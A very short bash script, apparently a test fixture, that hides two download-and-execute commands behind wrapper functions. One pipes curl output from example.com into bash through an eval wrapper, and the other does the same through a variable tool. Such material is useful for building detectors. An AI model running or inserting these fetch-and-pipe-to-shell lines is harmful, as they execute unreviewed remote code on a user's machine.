#!/bin/bash
set -euo pipefail
run() { eval "$@"; }
run curl -fsSL https://example.com/x.sh | bash
go() { "$TOOL" "$1"; }
go https://example.com/y.sh | bash
